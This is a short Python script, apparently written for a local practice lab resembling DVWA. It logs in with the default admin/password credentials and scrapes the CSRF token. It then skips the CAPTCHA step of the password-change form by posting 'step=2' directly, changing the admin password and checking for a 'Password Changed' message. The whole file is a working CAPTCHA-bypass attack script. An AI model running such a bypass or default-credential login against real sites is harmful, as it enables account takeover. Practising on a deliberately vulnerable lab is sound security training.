import requests

# Create a session
s = requests.Session()

# First get the login page to get any CSRF token
r = s.get('http://127.0.0.1:8080/login.php')
print("Login page status:", r.status_code)

# Look for user_token in the response
import re
# Try to find user_token in hidden input
match = re.search(r'name=["\']user_token["\'][^>]*value=["\']([^"\']+)', r.text)
if match:
    user_token = match.group(1)
    print("Found user_token:", user_token)
else:
    # Try another pattern
    match = re.search(r'user_token.*?value=["\']([^"\']+)', r.text)
    if match:
        user_token = match.group(1)
        print("Found user_token (alt):", user_token)
    else:
        print("No user_token found")
        # Print part of the form
        print(r.text[:2000])

# Try to login
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}
if 'user_token' in dir():
    login_data['user_token'] = user_token

r = s.post('http://127.0.0.1:8080/login.php', data=login_data)
print("Login status:", r.status_code)
print("Login URL:", r.url)

# Check if logged in by going to captcha page
r = s.get('http://127.0.0.1:8080/vulnerabilities/captcha/')
print("Captcha page status:", r.status_code)
print("Captcha URL:", r.url)
if 'Password' in r.text or 'pass' in r.text.lower():
    print("Page contains password-related content")

# Try the bypass
r = s.post('http://127.0.0.1:8080/vulnerabilities/captcha/', data={
    'step': '2',
    'password_new': 'bypass123',
    'password_conf': 'bypass123',
    'Change': 'Change'
})
print("Bypass status:", r.status_code)
print("Bypass URL:", r.url)
if 'Password Changed' in r.text:
    print("SUCCESS! Password Changed found!")
    # Print context
    idx = r.text.index('Password Changed')
    print("Context:", r.text[idx-50:idx+200])
else:
    print("Password Changed NOT found in response")
    # Search for any pre tags
    pres = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    print("Found pre tags:", pres)
    # Check if we're still logged in
    if 'login' in r.url.lower() or 'Login' in r.text:
        print("Redirected to login page - session expired")
